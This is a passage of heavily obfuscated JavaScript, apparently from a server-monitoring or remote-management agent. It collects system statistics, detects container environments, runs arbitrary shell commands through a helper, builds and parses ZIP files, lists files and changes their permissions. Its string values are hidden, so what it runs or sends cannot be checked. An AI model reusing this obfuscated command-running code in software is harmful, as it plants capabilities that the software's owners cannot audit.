                    const g2 = g1;
                    let l = '';
                    if (g['xFYuh'](k[g2(0xafa)], 0xc8)) {
                        g[g2(0x406)](f, new Error(g2(0x7c2)[g2(0x83f)](k[g2(0xafa)])));
                        return;
                    }
                    k['on'](g[g2(0xebb)], m => l += m), k['on'](g[g2(0xcda)], () => d(l[g2(0x5b0)]()));
                });
            j['on'](g1(0xfcc), f), j[g1(0x9f2)](0x1388, () => {
                const g3 = g1;
                j[g3(0x28a)](), c[g3(0x8ab)](f, new Error(c['LJrlF']));
            });
        });
    }
    [a0d9(0x8e4)](a) {
        const g4 = a0d9;
        return /^(\d{1,3}\.){3}\d{1,3}$/[g4(0xf92)](a);
    }
    ['isValidIPv6'](a) {
        const g5 = a0d9;
        if (!/^[0-9a-fA-F:]+$/[g5(0xf92)](a) || !a[g5(0x152)](':'))
            return ![];
        const b = a['split'](':')[0x0];
        return /^[23][0-9a-fA-F]{3}$/[g5(0xf92)](b);
    }
    async [a0d9(0x8c9)]() {
        const g6 = a0d9, a = {
                'mNSYp': function (m, n) {
                    return m / n;
                },
                'FXjwy': function (m, n) {
                    return m - n;
                },
                'uVBBU': function (m, n) {
                    return m / n;
                },
                'EQoZI': function (m, n) {
                    return m * n;
                },
                'ExqTu': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[g6(0x84e)]([
                a0u[g6(0x397)](),
                a0u[g6(0xf97)](),
                a0u['networkStats'](),
                a0u[g6(0x397)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a['mNSYp'](Date[g6(0x8da)](), 0x3e8), i = h - this[g6(0xd46)], j = a[g6(0xd5d)](g[g6(0xfee)], this[g6(0x954)]['tx']), k = a[g6(0xd5d)](g[g6(0xa2f)], this['lastNetworkStats']['rx']);
        this[g6(0x3e5)] += j, this[g6(0xbea)] += k, this['lastNetworkStats'] = {
            'tx': g[g6(0xfee)],
            'rx': g[g6(0xa2f)]
        }, this[g6(0xd46)] = h;
        const l = await a0u[g6(0x95b)]();
        return {
            'cpu': { 'usage': Math[g6(0xde8)](b[g6(0x397)]) },
            'ram': {
                'total': c[g6(0x3b1)],
                'used': c[g6(0x553)]
            },
            'swap': {
                'total': c['swaptotal'],
                'used': c[g6(0x247)]
            },
            'load': {
                'load1': a['uVBBU'](Math[g6(0xde8)](a[g6(0xcfa)](f['avgLoad'], 0x64)), 0x64),
                'load5': a[g6(0x9c0)](Math[g6(0xde8)](a[g6(0xcfa)](f['avgLoad'], 0x64)), 0x64),
                'load15': a[g6(0x9c0)](Math['round'](f[g6(0xb7b)] * 0x64), 0x64)
            },
            'disk': await this['_getDiskInfo'](),
            'network': {
                'up': Math[g6(0xde8)](j / i),
                'down': Math['round'](a['ExqTu'](k, i)),
                'totalUp': this[g6(0x3e5)],
                'totalDown': this[g6(0xbea)]
            },
            'connections': await this[g6(0x2b8)](),
            'uptime': a0p[g6(0x542)](),
            'process': l?.[g6(0x84e)] || 0x0,
            'message': ''
        };
    }
    async [a0d9(0x7d1)]() {
        const g7 = a0d9, a = {
                'iBOMD': g7(0xb63),
                'jqLxL': g7(0xde9),
                'alFIP': g7(0x1047),
                'NdNfZ': g7(0x5b8),
                'qCfme': 'docker',
                'VlXYK': g7(0x5b6),
                'oJNHu': g7(0x1dc),
                'EbaoA': g7(0x100c),
                'CgAtw': g7(0x9a0),
                'HpOvD': g7(0xec2),
                'ztPIZ': '/docker/containers/',
                'rePbX': 'workdir=/var/lib/docker',
                'FxfVa': '/pods/',
                'iVPRQ': 'kubelet',
                'OMljV': g7(0x498),
                'ssnFh': g7(0x502),
                'WPHCu': g7(0x262),
                'uryOZ': g7(0x59c),
                'IDian': g7(0x101b)
            };
        try {
            if (a0l[g7(0x8de)](g7(0x426)))
                return a['iBOMD'];
            if (a0l[g7(0x8de)](a[g7(0x6cf)]))
                return a[g7(0x3cc)];
            if (a0l['existsSync'](a[g7(0x822)])) {
                const b = a0l[g7(0x976)](a[g7(0x822)], g7(0xec2))[g7(0x544)]();
                if (b[g7(0x152)](a[g7(0x46c)]) || b[g7(0x152)](g7(0x72d)))
                    return a['iBOMD'];
                else {
                    if (b[g7(0x152)](g7(0x948)))
                        return a[g7(0x3e2)];
                    else {
                        if (b[g7(0x152)](a[g7(0x58e)]))
                            return a['EbaoA'];
                    }
                }
            }
            if (a0l[g7(0x8de)](a[g7(0xba4)])) {
                const c = a0l[g7(0x976)](g7(0x9a0), a[g7(0xd6e)]);
                if (c['includes'](a['ztPIZ']) || c['includes'](a['rePbX']))
                    return a[g7(0x6fb)];
                else {
                    if (c[g7(0x152)](a[g7(0x6c6)]) || c[g7(0x152)](a['iVPRQ']))
                        return a['VlXYK'];
                }
            }
            if (a0l[g7(0x8de)](a[g7(0x45c)])) {
                const d = a0l['readFileSync'](a['OMljV'], a[g7(0xd6e)]);
                if (d['includes'](g7(0xc80)))
                    return a[g7(0x1b5)];
            }
            if (a0l[g7(0x8de)](a['ssnFh'])) {
                const f = a0l[g7(0x976)](a[g7(0x1036)], a[g7(0xd6e)]);
                if (f['includes'](a[g7(0xe64)]) || f[g7(0x152)](a[g7(0x70c)]))
                    return a[g7(0xe64)];
            }
        } catch (g) {
        }
        return a['IDian'];
    }
    async [a0d9(0x4eb)]() {
        const g8 = a0d9, a = {
                'JyPkR': function (b, c) {
                    return b > c;
                },
                'TZPqa': g8(0x533),
                'JYwtj': function (b, c) {
                    return b !== c;
                },
                'jDCZT': g8(0x7fa)
            };
        try {
            const b = await a0u[g8(0xf6b)](), c = b[g8(0x595)](g => {
                    const g9 = g8;
                    return a['JyPkR'](g[g9(0x885)], 0x0) && g[g9(0xa49)] !== a['TZPqa'] && a[g9(0x66c)](g[g9(0xa49)], a['jDCZT']) && g['fs'][g9(0x1ba)](g9(0x575));
                }), d = c[g8(0xdfa)]((g, h) => g + h[g8(0x885)], 0x0), f = c[g8(0xdfa)]((g, h) => g + h[g8(0x96a)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0d9(0x2b8)]() {
        const ga = a0d9;
        try {
            const a = await a0u[ga(0x7ef)](), b = a[ga(0x595)](d => d[ga(0x971)] === ga(0x9ba))['length'], c = a[ga(0x595)](d => d[ga(0x971)] === 'udp')[ga(0xc54)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0aQ {
    static async [a0d9(0xd97)](a, b = {}) {
        const gb = a0d9, c = {
                'eVXJC': function (d, f) {
                    return d === f;
                },
                'eRadB': 'number',
                'iwTRx': function (d, f) {
                    return d(f);
                },
                'zcjGM': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[gb(0x1075)](),
                env: env = {},
                timeout: timeout = a0aE['Rtimeout']
            } = b;
        return new Promise(d => {
            const gc = gb, f = Date[gc(0x8da)](), g = a0r(a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[gc(0xca4)](timeout, 0x3e8),
                    'maxBuffer': c[gc(0xca4)](c[gc(0xca4)](0xa, 0x400), 0x400)
                }, (h, i, j) => {
                    const gd = gc, k = Date['now']() - f, l = h && h[gd(0x3cd)] && h['signal'];
                    let m = i || '';
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            c[gd(0x833)](typeof h[gd(0x503)], c[gd(0x60a)]) ? n = h[gd(0x503)] : n = -0x1;
                    }
                    c[gd(0xf3b)](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
function a0aR(a) {
    const ge = a0d9, b = {
            'oHqjs': function (c, d) {
                return c !== d;
            },
            'sacKq': ge(0x327),
            'WBtvw': 'ENOTDIR',
            'fnSuc': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l[ge(0xf9b)][ge(0xd99)](a0o[ge(0x5a0)](a0aE[ge(0xc7c)])), d = a0o[ge(0x5a0)](a);
        let f = d;
        while (!![]) {
            try {
                a0l['lstatSync'](f);
                break;
            } catch (j) {
                if (b[ge(0xdd2)](j[ge(0x503)], b['sacKq']) && b[ge(0xdd2)](j[ge(0x503)], b[ge(0xc17)]))
                    throw j;
                const k = a0o['dirname'](f);
                if (b[ge(0x43b)](k, f))
                    return ![];
                f = k;
            }
        }
        const g = a0l[ge(0xf9b)]['native'](f), h = a0o[ge(0x9b2)](c, g);
        if (h[ge(0x1ba)]('..') || a0o[ge(0xd76)](h))
            return ![];
        const i = a0o[ge(0x9b2)](f, d);
        if (i && (i[ge(0x1ba)]('..') || a0o[ge(0xd76)](i)))
            return ![];
        return !![];
    } catch (l) {
        return ![];
    }
}
class a0aS {
    static [a0d9(0xac0)] = 0x4e20;
    static ['ZIP_MAX_TOTAL_BYTES'] = 0x200 * 0x400 * 0x400;
    static [a0d9(0x4ba)] = 0x1f4;
    static [a0d9(0x613)] = null;
    static [a0d9(0xa8d)](a) {
        const gf = a0d9, b = {
                'SlKTU': function (g, h) {
                    return g < h;
                },
                'UsUYB': function (g, h) {
                    return g & h;
                },
                'snRxL': function (g, h) {
                    return g >>> h;
                },
                'RAjtP': function (g, h) {
                    return g ^ h;
                },
                'mxsPu': function (g, h) {
                    return g & h;
                },
                'RSxTt': function (g, h) {
                    return g >>> h;
                },
                'YpFPF': function (g, h) {
                    return g ^ h;
                }
            };
        if (!a0aS[gf(0x613)]) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; b[gf(0x84a)](h, 0x100); h++) {
                let j = h;
                for (let l = 0x0; b['SlKTU'](l, 0x8); l++)
                    j = b[gf(0x5ab)](j, 0x1) ? 0xedb88320 ^ b[gf(0xde1)](j, 0x1) : j >>> 0x1;
                g[h] = j;
            }
            a0aS[gf(0x613)] = g;
        }
        const d = a0aS[gf(0x613)];
        let f = -0x1;
        for (let m = 0x0; b[gf(0x84a)](m, a[gf(0xc54)]); m++)
            f = b[gf(0xaaf)](f >>> 0x8, d[b[gf(0xc93)](f ^ a[m], 0xff)]);
        return b[gf(0x642)](b[gf(0x32f)](f, -0x1), 0x0);
    }
    static [a0d9(0x742)](a) {
        const gg = a0d9, b = {
                'HOpvg': function (g, h) {
                    return g & h;
                },
                'vxSQy': function (g, h) {
                    return g | h;
                },
                'xHavH': function (g, h) {
                    return g << h;
                },
                'jePke': function (g, h) {
                    return g >> h;
                },
                'NmBan': function (g, h) {
                    return g | h;
                },
                'RVXNE': function (g, h) {
                    return g << h;
                },
                'KQQKz': function (g, h) {
                    return g - h;
                },
                'vQOCb': function (g, h) {
                    return g << h;
                },
                'vqCuv': function (g, h) {
                    return g + h;
                }
            }, c = b[gg(0x75d)](b[gg(0xcf5)](a[gg(0x538)]() << 0xb | b[gg(0x19d)](a[gg(0x23f)](), 0x5), b[gg(0xa84)](a[gg(0x601)](), 0x1)), 0xffff), f = b[gg(0x75d)](b['NmBan'](b['RVXNE'](b[gg(0xeb9)](a[gg(0x97b)](), 0x7bc), 0x9) | b[gg(0x1b1)](b[gg(0x907)](a[gg(0x5a1)](), 0x1), 0x5), a[gg(0x237)]()), 0xffff);
        return {
            'time': c,
            'date': f
        };
    }
    static [a0d9(0xdb5)](a) {
        const gh = a0d9, b = {
                'OystE': function (i, j) {
                    return i < j;
                },
                'SnePB': function (i, j) {
                    return i - j;
                },
                'uFPSD': function (i, j) {
                    return i >= j;
                },
                'PMAtV': function (i, j) {
                    return i(j);
                },
                'TNwvb': function (i, j) {
                    return i + j;
                }
            }, c = a0l[gh(0x8cc)](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const gi = gh;
            let j = 0x0;
            while (b[gi(0xf33)](j, i[gi(0xc54)]))
                j += a0l['writeSync'](c, i, j, b[gi(0xb1b)](i[gi(0xc54)], j));
        };
        return {
            'add'(i, j, k, l = ![]) {
                const gj = gh;
                if (b[gj(0x63b)](g, a0aS[gj(0xac0)]))
                    return ![];
                const m = Buffer[gj(0xca5)](i, gj(0xec2));
                j = j || Buffer['alloc'](0x0);
                const n = l ? 0x0 : a0aS[gj(0xa8d)](j);
                let o = 0x0, p = j;
                if (!l && j[gj(0xc54)] > 0x0) {
                    const u = a0n[gj(0xe59)](j, { 'level': 0x6 });
                    b[gj(0xf33)](u[gj(0xc54)], j[gj(0xc54)]) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0aS[gj(0x742)](k || new Date()), s = Buffer[gj(0x901)](0x1e);
                s['writeUInt32LE'](0x4034b50, 0x0), s[gj(0xf1a)](0x14, 0x4), s[gj(0xf1a)](0x800, 0x6), s[gj(0xf1a)](o, 0x8), s['writeUInt16LE'](q, 0xa), s['writeUInt16LE'](r, 0xc), s[gj(0x2bd)](n, 0xe), s[gj(0x2bd)](p['length'], 0x12), s[gj(0x2bd)](j[gj(0xc54)], 0x16), s['writeUInt16LE'](m[gj(0xc54)], 0x1a), s[gj(0xf1a)](0x0, 0x1c), h(s), b[gj(0x57b)](h, m), h(p);
                const t = Buffer[gj(0x901)](0x2e);
                return t[gj(0x2bd)](0x2014b50, 0x0), t['writeUInt16LE'](0x14, 0x4), t[gj(0xf1a)](0x14, 0x6), t[gj(0xf1a)](0x800, 0x8), t[gj(0xf1a)](o, 0xa), t[gj(0xf1a)](q, 0xc), t['writeUInt16LE'](r, 0xe), t[gj(0x2bd)](n, 0x10), t[gj(0x2bd)](p['length'], 0x14), t['writeUInt32LE'](j[gj(0xc54)], 0x18), t[gj(0xf1a)](m['length'], 0x1c), t[gj(0xf1a)](0x0, 0x1e), t['writeUInt16LE'](0x0, 0x20), t[gj(0xf1a)](0x0, 0x22), t[gj(0xf1a)](0x0, 0x24), t[gj(0x2bd)](l ? 0x10 : 0x0, 0x26), t[gj(0x2bd)](f, 0x2a), d[gj(0xb66)](t, m), f += b['TNwvb'](0x1e, m[gj(0xc54)]) + p[gj(0xc54)], g++, !![];
            },
            'close'() {
                const gk = gh;
                let i;
                try {
                    const j = Buffer[gk(0x83f)](d), k = Buffer[gk(0x901)](0x16);
                    k['writeUInt32LE'](0x6054b50, 0x0), k[gk(0xf1a)](0x0, 0x4), k['writeUInt16LE'](0x0, 0x6), k['writeUInt16LE'](g, 0x8), k[gk(0xf1a)](g, 0xa), k[gk(0x2bd)](j[gk(0xc54)], 0xc), k['writeUInt32LE'](f, 0x10), k[gk(0xf1a)](0x0, 0x14), h(j), b[gk(0x57b)](h, k);
                } catch (l) {
                    i = l;
                }
                try {
                    a0l[gk(0xd7a)](c);
                } catch (m) {
                    if (!i)
                        throw m;
                }
                if (i)
                    throw i;
                return g;
            }
        };
    }
    static [a0d9(0xadd)](a) {
        const gl = a0d9, b = {
                'FSatz': function (n, o) {
                    return n - o;
                },
                'fPqkA': function (n, o) {
                    return n + o;
                },
                'fDREy': function (n, o) {
                    return n === o;
                },
                'QnRMG': function (n, o) {
                    return n < o;
                },
                'iVXwU': 'Not\x20a\x20zip\x20file',
                'tdDvZ': function (n, o) {
                    return n + o;
                },
                'aiELx': function (n, o) {
                    return n + o;
                },
                'bUjAb': function (n, o) {
                    return n + o;
                },
                'urWFb': function (n, o) {
                    return n <= o;
                },
                'mmdVZ': function (n, o) {
                    return n + o;
                },
                'KMvst': function (n, o) {
                    return n + o;
                },
                'UjHUb': function (n, o) {
                    return n + o;
                },
                'fjDqm': function (n, o) {
                    return n + o;
                },
                'tkKmR': function (n, o) {
                    return n + o;
                },
                'dNwCj': function (n, o) {
                    return n + o;
                },
                'OrGrX': function (n, o) {
                    return n & o;
                },
                'lexFH': function (n, o) {
                    return n === o;
                },
                'RhJWU': function (n, o) {
                    return n === o;
                },
                'CNiaD': function (n, o) {
                    return n + o;
                },
                'OZdtv': function (n, o) {
                    return n + o;
                },
                'kvMlZ': function (n, o) {
                    return n + o;
                },
                'MdSuP': function (n, o) {
                    return n + o;
                },
                'bDSZq': function (n, o) {
                    return n + o;
                }
            }, c = a0l['readFileSync'](a);
        let d = -0x1;
        const f = Math['max'](0x0, b[gl(0xaee)](c[gl(0xc54)], b[gl(0x884)](0xffff, 0x16)));
        for (let n = c[gl(0xc54)] - 0x16; n >= f; n--) {
            if (b[gl(0x26c)](c[gl(0xa91)](n), 0x6054b50)) {
                d = n;
                break;
            }
        }
        if (b['QnRMG'](d, 0x0))
            throw new Error(b[gl(0xef7)]);
        const g = c[gl(0xee0)](b[gl(0x884)](d, 0xa)), h = c['readUInt32LE'](b[gl(0x32b)](d, 0xc)), j = c[gl(0xa91)](b[gl(0xaa0)](d, 0x10)), k = [];
        let l = j;
        const m = b['bUjAb'](j, h);
        for (let o = 0x0; b[gl(0x486)](o, g) && b['urWFb'](b['mmdVZ'](l, 0x2e), m); o++) {
            if (c[gl(0xa91)](l) !== 0x2014b50)
                break;
            const q = c['readUInt16LE'](b[gl(0x579)](l, 0x8)), r = c[gl(0xee0)](b[gl(0xac1)](l, 0xa)), s = c[gl(0xa91)](b[gl(0x9fc)](l, 0x10)), t = c[gl(0xa91)](b[gl(0xaa0)](l, 0x14)), u = c[gl(0xa91)](l + 0x18), v = c[gl(0xee0)](b[gl(0xaa0)](l, 0x1c)), w = c[gl(0xee0)](b['tdDvZ'](l, 0x1e)), x = c[gl(0xee0)](b[gl(0x579)](l, 0x20)), y = c[gl(0xa91)](b[gl(0x579)](l, 0x26)), z = c['readUInt32LE'](b[gl(0x438)](l, 0x2a)), A = c[gl(0x47b)](b[gl(0x437)](l, 0x2e), b[gl(0xd24)](l + 0x2e, v))[gl(0x43a)](gl(0xec2));
            l += b[gl(0x579)](0x2e + v, w) + x;
            const B = {
                'name': A,
                'isDir': A[gl(0x102a)]('/') || b[gl(0xc9d)](y, 0x10) !== 0x0,
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': (q & 0x1) !== 0x0,
                'zip64': t === 0xffffffff || b[gl(0x26c)](u, 0xffffffff) || b['lexFH'](z, 0xffffffff),
                'data': null
            };
            if (!B[gl(0xd19)] && !B[gl(0x4bd)] && !B['zip64']) {
                if (z + 0x1e <= c[gl(0xc54)] && b['RhJWU'](c[gl(0xa91)](z), 0x4034b50)) {
                    const C = c[gl(0xee0)](b['CNiaD'](z, 0x1a)), D = c['readUInt16LE'](b['OZdtv'](z, 0x1c)), E = b[gl(0x884)](b[gl(0x908)](b[gl(0x5e5)](z, 0x1e), C), D);
                    E + t <= c['length'] && (B[gl(0xe83)] = c[gl(0x47b)](E, b[gl(0xeaf)](E, t)));
                }
            }
            k[gl(0xb66)](B);
        }
        return k;
    }
    static [a0d9(0xa11)](a) {
        const gm = a0d9, b = {
                'WVdiW': function (c, d) {
                    return c === d;
                },
                'IiGvS': function (c, d) {
                    return c === d;
                },
                'yhYHZ': function (c, d) {
                    return c + d;
                }
            };
        if (b['WVdiW'](a['method'], 0x0))
            return a['data'];
        if (b[gm(0x362)](a[gm(0x174)], 0x8))
            return a0n[gm(0x363)](a[gm(0xe83)], { 'maxOutputLength': b[gm(0x741)](a0aS[gm(0x1e1)], 0x1) });
        throw new Error(gm(0x84f)[gm(0x83f)](a['method']));
    }
}
function a0aT(a) {
    const gn = a0d9, b = {
            'PBxMg': gn(0x222),
            'VIbnr': gn(0x5f4),
            'aJaAA': gn(0xa04),
            'gpSkw': 'EPERM',
            'WkXvU': gn(0x7c7),
            'HtrFQ': gn(0x9b8),
            'YZkyK': gn(0xa0f),
            'TPSZQ': gn(0x327),
            'rwoMp': gn(0x26d),
            'gvFTq': gn(0xd9c),
            'Ylljt': gn(0x325)
        };
    switch (a && a[gn(0x503)]) {
    case b[gn(0x3fe)]:
        return b[gn(0x1055)];
    case b['aJaAA']:
    case b[gn(0x511)]:
        return gn(0x8c1);
    case gn(0xc01):
        return b['WkXvU'];
    case b[gn(0x956)]:
        return b[gn(0x747)];
    case b['TPSZQ']:
        return b[gn(0x63a)];
    case b[gn(0x746)]:
        return b['Ylljt'];
    default:
        return 'unknown';
    }
}
class a0aU extends Error {
    constructor(a, b = 0x1f4, c) {
        const go = a0d9, d = {
                'mqMIy': function (f, g) {
                    return f(g);
                }
            };
        super(a, c ? { 'cause': c } : undefined), this[go(0x13d)] = b, this[go(0xe61)] = d['mqMIy'](a0aT, c || this);
    }
}
class a0aV {
    static [a0d9(0x393)](a) {
        const gp = a0d9, b = {
                'pagrG': function (k, l) {
                    return k - l;
                },
                'aknvy': function (k, l) {
                    return k === l;
                },
                'dCAyy': gp(0xa5d),
                'kmxfT': function (k, l) {
                    return k === l;
                },
                'fcPvc': function (k, l) {
                    return k > l;
                }
            }, c = Array[gp(0xedd)](a) ? a : [], d = c[gp(0xc54)], f = c[gp(0x595)](k => k && k[gp(0x13d)] === 'ok')['length'], g = b[gp(0xe53)](d, f);
        let h = 'ok', i = '';
        if (b['aknvy'](d, 0x0))
            h = gp(0xfcc), i = b[gp(0x8b8)];
        else {
            if (b[gp(0xb8b)](f, 0x0))
                h = 'error', i = gp(0x323)['concat'](d, gp(0xb55));
            else
                b[gp(0x2a2)](g, 0x0) && (h = gp(0xf3c), i = ''[gp(0x83f)](g, gp(0x617))['concat'](d, gp(0xb55)));
        }
        const j = {
            'status': h,
            'total': d,
            'success': f,
            'results': c
        };
        if (i)
            j[gp(0x769)] = i;
        return j;
    }
    static ['_mountReadOnlyFromMountInfo'](a, b) {
        const gq = a0d9, c = {
                'rAryU': function (j, k) {
                    return j == k;
                },
                'GihhN': function (j, k) {
                    return j(k);
                },
                'dARZl': gq(0xec2),
                'keVPy': function (j, k) {
                    return j(k);
                },
                'twJgD': function (j, k) {
                    return j < k;
                },
                'ZUZRj': function (j, k) {
                    return j === k;
                },
                'SwhPa': function (j, k) {
                    return j + k;
                },
                'fkate': function (j, k) {
                    return j <= k;
                }
            };
        if (c[gq(0x7d0)](a, null) || b == null)
            return undefined;
        const d = a0o['posix'][gq(0x2b0)](c[gq(0xf26)](String, a));
        if (!a0o[gq(0x788)][gq(0xd76)](d))
            return undefined;
        const f = Buffer['isBuffer'](b) ? b[gq(0x43a)](c[gq(0xf7f)]) : c[gq(0x860)](String, b), g = {
                '040': '\x20',
                '011': '\x09',
                '012': '\x0a',
                '134': '\x5c'
            };
        let h = -0x1, i;
        for (const j of f[gq(0xa6a)](/\r?\n/)) {
            const k = j['trim']()[gq(0xa6a)](/\s+/);
            if (c[gq(0xd22)](k[gq(0xc54)], 0x6) || !k[0x4])
                continue;
            const l = k[0x4][gq(0x8d4)](/\\(040|011|012|134)/g, (o, p) => g[p]), m = a0o[gq(0x788)][gq(0x2b0)](l);
            if (!a0o[gq(0x788)][gq(0xd76)](m))
                continue;
            const n = c['ZUZRj'](m, '/') ? '/' : c[gq(0x352)](m[gq(0x8d4)](/\/+$/, ''), '/');
            if (d !== m && !d[gq(0x1ba)](n))
                continue;
            if (c[gq(0xeb7)](m[gq(0xc54)], h))
                continue;
            i = k[0x5][gq(0xa6a)](',')[gq(0x152)]('ro'), h = m[gq(0xc54)];
        }
        return i;
    }
    static async [a0d9(0xf61)](a, b = ![]) {
        const gr = a0d9, c = {
                'uTkRd': gr(0xbb2),
                'LEagp': function (h, i) {
                    return h & i;
                },
                'cBoii': gr(0xa7a),
                'keNXM': gr(0xe20),
                'hWxYY': function (h, i) {
                    return h(i);
                }
            }, d = a0o['resolve'](a0aE[gr(0xc7c)], a || '.');
        if (!a0aR(d))
            throw new Error(c['cBoii']);
        if (!a0l['existsSync'](d))
            throw new Error(c['keNXM']);
        const f = [], g = h => {
                const gs = gr, i = a0l[gs(0xdb7)](h);
                for (const j of i) {
                    const k = a0o[gs(0xd9d)](h, j), l = a0l[gs(0x91f)](k), m = new a0Z();
                    m[gs(0x94b)] = j, m[gs(0x4fa)] = a0o[gs(0x9b2)](a0aE[gs(0xc7c)], k), m[gs(0xa49)] = l['isDirectory']() ? gs(0x497) : c[gs(0xf5c)], m[gs(0x885)] = l[gs(0x885)], m['mtime'] = l[gs(0x1a5)]['toISOString'](), m['mode'] = this[gs(0x2fd)](l[gs(0x56f)], l[gs(0x6f4)]()), m[gs(0xdbb)] = '0o'['concat'](c[gs(0x6dd)](l[gs(0x56f)], 0x1ff)[gs(0x43a)](0x8)), m[gs(0x7cf)] = ''['concat'](l[gs(0xb6f)], ':')[gs(0x83f)](l[gs(0xbf8)]), f['push'](m), b && l[gs(0x6f4)]() && g(k);
                }
            };
        return c[gr(0x3aa)](g, d), f;
    }
    static async [a0d9(0x46b)](a) {
        const gt = a0d9, b = {
                'NZaRp': function (f, g) {
                    return f === g;
                },
                'KcxiD': gt(0x6a3),
                'aaAJz': gt(0xec2),
                'pkAFg': function (f, g) {
                    return f(g);
                },
                'FQtRq': function (f, g) {
                    return f & g;
                },
                'LlSZm': gt(0x497),
                'KLvXH': gt(0xbb2),
                'zJXev': function (f, g) {
                    return f !== g;
                }
            }, c = [];
        let d = null;
        if (b[gt(0x24d)](process[gt(0x4a4)], b[gt(0x173)]))
            try {
                d = a0l['readFileSync']('/proc/self/mountinfo', b[gt(0xe81)]);
            } catch (f) {
            }
        for (const g of a) {
            const h = a0o[gt(0x5a0)](a0aE[gt(0xc7c)], g);
            if (!b[gt(0xa34)](a0aR, h))
                continue;
            try {
                const i = a0l['statSync'](h), j = this[gt(0xaa3)](h, a0l[gt(0xc8c)][gt(0x8b2)]), k = this['_checkAccess'](h, a0l['constants']['W_OK']), l = this[gt(0xaa3)](h, a0l['constants'][gt(0xb0d)]), m = new a0a0();
                m[gt(0x4fa)] = a0o['relative'](a0aE[gt(0xc7c)], h), m['name'] = a0o[gt(0xe49)](h), m[gt(0x56f)] = this['_formatMode'](i[gt(0x56f)], i[gt(0x6f4)]()), m[gt(0xdbb)] = '0o'[gt(0x83f)](b[gt(0xe5c)](i['mode'], 0x1ff)['toString'](0x8)), m[gt(0xa49)] = i[gt(0x6f4)]() ? b[gt(0x337)] : b[gt(0xa14)], m[gt(0x328)] = j, m[gt(0xf24)] = k, m[gt(0xf40)] = l;
                if (b[gt(0xeb0)](d, null)) {
                    let n;
                    try {
                        n = a0l[gt(0xf9b)][gt(0xd99)](h);
                    } catch (o) {
                    }
                    if (n) {
                        const p = this[gt(0xf91)](n, d);
                        if (b['zJXev'](p, undefined))
                            m[gt(0xe3c)] = p;
                    }
                }
                c['push'](m);
            } catch (q) {
            }
        }
        return c;
    }
    static [a0d9(0xaa3)](a, b) {
        const gu = a0d9;
        try {
            return a0l[gu(0x7df)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0d9(0xc46)](a) {
        const gv = a0d9, b = {
                'qYBqE': function (c, d) {
                    return c === d;
                },
                'gFqas': gv(0xba0),
                'LajCV': function (c, d, f) {
                    return c(d, f);
                },
                'bGXpH': 'Unsupported\x20permission\x20format,\x20only\x20octal\x20strings\x20are\x20supported'
            };
        if (typeof a === gv(0x31f))
            return a;
        if (b['qYBqE'](typeof a, b[gv(0x630)])) {
            const c = a['trim']();
            if (/^[0-7]{3,4}$/[gv(0xf92)](c))
                return b[gv(0x517)](parseInt, c, 0x8);
        }
        throw new Error(b[gv(0x9b3)]);
    }
    static [a0d9(0x2fd)](a, b) {
        const gw = a0d9, c = {
                'XqolZ': function (i, j) {
                    return i & j;
                },
                'nQAXb': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c[gw(0xe18)](a, 0x1ff)[gw(0x43a)](0x8)[gw(0x529)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[gw(0x847)](parseInt, i, 0xa);
            h += f[gw(0xf2e)]((k, l) => j & 0x4 >> l ? k : '-')[gw(0xd9d)]('');
        }
        return h;
    }
    static async ['setFilePermissions'](a, b = ![]) {
        const gx = a0d9, c = {
                'BOEgR': function (g, h) {
                    return g(h);
                },
                'NAcah': gx(0xf3e),
                'qhRLq': function (g, h) {
                    return g(h);
                },
                'KkklV': gx(0xfcc)
            }, d = [];
        for (const [g, h] of Object['entries'](a)) {
            const i = a0o[gx(0x5a0)](a0aE[gx(0xc7c)], g);
            if (!a0aR(i)) {
                d[gx(0xb66)]({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[gx(0x35c)]
                });
                continue;
            }
            try {
                const j = this[gx(0xc46)](h), k = m => {
                        a0l['chmodSync'](m, j);
                    };
                if (b && a0l['existsSync'](i) && a0l[gx(0x91f)](i)[gx(0x6f4)]()) {
                    const m = n => {
                        const gy = gx;
                        k(n);
                        const o = a0l[gy(0xdb7)](n);
                        for (const p of o) {
                            const q = a0o[gy(0xd9d)](n, p);
                            a0l[gy(0x91f)](q)[gy(0x6f4)]() ? c[gy(0xee2)](m, q) : c['BOEgR'](k, q);
                        }
                    };
                    m(i);
                } else
                    k(i);
                const l = j['toString'](0x8);
                d[gx(0xb66)]({
                    'path': g,
                    'requested': c[gx(0x1011)](String, h),
                    'applied': l,
                    'mode_octal': '0o'[gx(0x83f)](l),
                    'status': 'ok'
                });
            } catch (n) {
                d[gx(0xb66)]({
                    'path': g,
                    'requested': c[gx(0x1011)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[gx(0x6f9)],
                    'message': n[gx(0x769)]
                });
            }
        }
        const f = d['filter'](o => o['status'] === 'ok')[gx(0xc54)];
        return {
            'status': 'ok',
            'total': d[gx(0xc54)],
            'success': f,
            'results': d
        };
    }
    static async [a0d9(0xa0a)](a) {
        const gz = a0d9, b = {
                'blUhT': 'Access\x20denied:\x20path\x20outside\x20root',
                'ZOyiB': function (h, i) {
                    return h > i;
                },
                'EriZR': gz(0xe8f),
                'gPywn': gz(0x66e),
                'iFPdJ': gz(0x368)
